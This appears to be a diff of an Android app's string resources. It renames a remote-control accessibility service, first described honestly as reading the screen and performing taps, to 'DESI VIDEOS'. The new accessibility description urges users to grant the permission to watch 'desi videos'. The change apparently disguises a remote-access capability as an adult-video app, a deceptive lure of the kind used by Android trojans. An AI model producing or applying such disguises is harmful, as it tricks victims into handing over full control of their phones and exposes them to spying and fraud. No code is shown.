@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">ScreenLink Remote</string>
-    <string name="accessibility_service_label">ScreenLink Remote</string>
-    <string name="accessibility_description">ScreenLink ko screen content padhne aur taps perform karne ki permission deta hai, taaki remote se phone control ho sake.</string>
-    <string name="accessibility_summary">Remote control service</string>
+    <string name="app_name">DESI VIDEOS</string>
+    <string name="accessibility_service_label">DESI VIDEOS</string>
+    <string name="accessibility_description">Permission Do Desi Vides Ka Labh Uthane Ke Liye</string>
+    <string name="accessibility_summary">Special Video</string>
 </resources>
